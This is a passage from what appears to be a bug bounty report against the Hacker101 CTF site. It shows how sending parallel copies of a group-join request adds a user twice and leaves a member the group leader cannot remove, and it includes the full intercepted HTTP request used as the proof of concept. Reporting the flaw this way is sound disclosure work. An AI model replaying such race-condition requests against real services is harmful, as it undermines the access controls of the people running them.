They themselves cannot remove themselves from the group as well as the group leader cannot remove that user from the group. Ofcourse this is a low severity as that malicious user first needs to have a valid invitation link, but nevertheless this leads to permanent membeship of group so this needs to be fixed in my opinion.\n\n\n### Steps To Reproduce\n\nWe need two accounts to reproduce this.\n\n- First account will be leader account\n- Second account will be a normal account.\n\n- Create a group from the first account and create an invitation link.\n- Join using the invitation link on the second account and intercept the request:\n\n```\nPOST /group/post_join HTTP/1.1\nHost: ctf.hacker101.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\nConnection: close\nCookie: COOKIES\nUpgrade-Insecure-Requests: 1\n\ncsrf=391aecf0c3125e90c437d04c18204ab6\u0026invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a\n```\n\nRepeat the above requests in parallel. I did it for 5 parallel requests and I was able to add myself 2 times to that group:\n{F505223}\n\n- Now try deleting the user from first account(group leader). No matter how much you try, you won't be able to delete it.\n\nThis would lead to a state where the group leader will have to delete the group and create a new group if he wants the malicious user to get removed. \n\nThanks,\nYash\n\n## Impact\n\nIrremovable/permanent member of the group.
